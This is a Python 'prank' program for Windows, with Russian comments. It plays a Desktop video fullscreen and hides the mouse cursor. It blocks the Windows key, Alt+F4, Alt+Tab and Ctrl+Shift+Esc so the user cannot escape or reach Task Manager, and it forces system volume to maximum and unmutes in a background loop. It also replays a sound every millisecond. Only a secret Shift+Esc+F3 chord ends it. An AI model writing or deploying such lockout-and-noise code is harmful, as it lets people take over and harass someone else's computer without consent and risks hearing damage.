import pygame
import cv2
import os
import glob
import time
import threading
import keyboard
import sys
import numpy as np
import ctypes
from ctypes import wintypes

# ==================== СВЕРНУТЬ КОНСОЛЬ ====================
try:
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 6)
except:
    pass

# ==================== API ГРОМКОСТИ ====================
USE_API = False
system_volume = None
try:
    from ctypes import cast, POINTER
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    system_volume = cast(interface, POINTER(IAudioEndpointVolume))
    USE_API = True
except:
    pass

# ==================== ПОИСК ФАЙЛОВ ====================
def find_file(pattern):
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    files = glob.glob(os.path.join(desktop, pattern))
    if not files:
        files = glob.glob(os.path.join(desktop, pattern.lower()))
    return files[0] if files else None

audio_file = find_file("6767.*")
video_file = find_file("55.*")
sound_file = find_file("100.*")

if not audio_file or not video_file:
    sys.exit()

# ==================== ФЛАГ ВЫХОДА ====================
_exit_flag = False

def exit_prank(*args, **kwargs):
    global _exit_flag
    if _exit_flag:
        return
    _exit_flag = True
    try:
        pygame.mixer.music.stop()
    except:
        pass
    try:
        pygame.mixer.stop()
    except:
        pass
    try:
        keyboard.unhook_all()
    except:
        pass
    os._exit(0)

# ==================== ХОТКЕЙ ВЫХОДА ====================
try:
    keyboard.add_hotkey('shift+esc+f3', exit_prank)
except:
    pass

# ==================== СТРАХОВКА pynput ====================
try:
    from pynput import keyboard as pkeyboard
    _pressed = set()

    def _on_press(key):
        _pressed.add(key)
        shift = any(k in _pressed for k in (
            pkeyboard.Key.shift, pkeyboard.Key.shift_l, pkeyboard.Key.shift_r))
        esc = pkeyboard.Key.esc in _pressed
        f3 = pkeyboard.Key.f3 in _pressed
        if shift and esc and f3:
            exit_prank()

    def _on_release(key):
        _pressed.discard(key)

    _listener = pkeyboard.Listener(on_press=_on_press, on_release=_on_release)
    _listener.daemon = True
    _listener.start()
except:
    pass

# ==================== БЛОКИРОВКА WIN И ОСТАЛЬНОГО ====================
def _noop(*a, **k):
    pass

try:
    keyboard.add_hotkey('left windows', _noop, suppress=True)
    keyboard.add_hotkey('right windows', _noop, suppress=True)
    keyboard.add_hotkey('alt+f4', _noop, suppress=True)
    keyboard.add_hotkey('alt+tab', _noop, suppress=True)
    keyboard.add_hotkey('ctrl+esc', _noop, suppress=True)
    keyboard.add_hotkey('ctrl+shift+esc', _noop, suppress=True)
except:
    pass

# ==================== ГРОМКОСТЬ 100% СРАЗУ ====================
if USE_API:
    try:
        system_volume.SetMasterVolumeLevelScalar(1.0, None)
        system_volume.SetMute(0, None)
    except:
        pass

if not USE_API:
    for _ in range(50):
        keyboard.send('volume up')
        time.sleep(0.01)

# ==================== ФОНОВЫЙ ПОТОК ГРОМКОСТИ ====================
def force_volume():
    while not _exit_flag:
        if USE_API:
            try:
                cur = system_volume.GetMasterVolumeLevelScalar()
                if cur < 0.999:
                    system_volume.SetMasterVolumeLevelScalar(1.0, None)
                if system_volume.GetMute():
                    system_volume.SetMute(0, None)
            except:
                pass
        if not USE_API:
            try:
                keyboard.send('volume up')
            except:
                pass
        time.sleep(0.01)

threading.Thread(target=force_volume, daemon=True).start()
# ==================== PYGAME ====================
pygame.init()
pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=512)
infoObject = pygame.display.Info()
W, H = infoObject.current_w, infoObject.current_h
screen = pygame.display.set_mode((W, H), pygame.FULLSCREEN)
pygame.mouse.set_visible(False)

# ==================== МУЗЫКА 6767.* ====================
try:
    pygame.mixer.music.load(audio_file)
    pygame.mixer.music.set_volume(1.0)
    pygame.mixer.music.play(-1)
except:
    pass

# ==================== ЗВУК "СТО" КАЖДУЮ МИЛЛИСЕКУНДУ ====================
# 0.001 = 1 мс (как просили). Если звук рваный — поставьте 0.01
SOUND_INTERVAL = 0.001
_sound_obj = None
if sound_file:
    try:
        _sound_obj = pygame.mixer.Sound(sound_file)
        _sound_obj.set_volume(1.0)
    except:
        _sound_obj = None

def play_100_loop():
    if _sound_obj is None:
        return
    while not _exit_flag:
        try:
            _sound_obj.play()
        except:
            pass
        time.sleep(SOUND_INTERVAL)

threading.Thread(target=play_100_loop, daemon=True).start()

# ==================== ВИДЕО ====================
cap = cv2.VideoCapture(video_file)
video_fps = cap.get(cv2.CAP_PROP_FPS)
if video_fps <= 0 or video_fps > 120:
    video_fps = 30

clock = pygame.time.Clock()
running = True

# ==================== ГЛАВНЫЙ ЦИКЛ ====================
while running and not _exit_flag:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    ret, frame = cap.read()

    if not ret:
        cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
        ret, frame = cap.read()
        if not ret:
            continue

    frame = cv2.resize(frame, (W, H), interpolation=cv2.INTER_LINEAR)
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    frame = np.rot90(frame)
    surface = pygame.surfarray.make_surface(frame)
    screen.blit(surface, (0, 0))
    pygame.display.flip()

    clock.tick(video_fps)

# ==================== ЗАВЕРШЕНИЕ ====================
cap.release()
pygame.quit()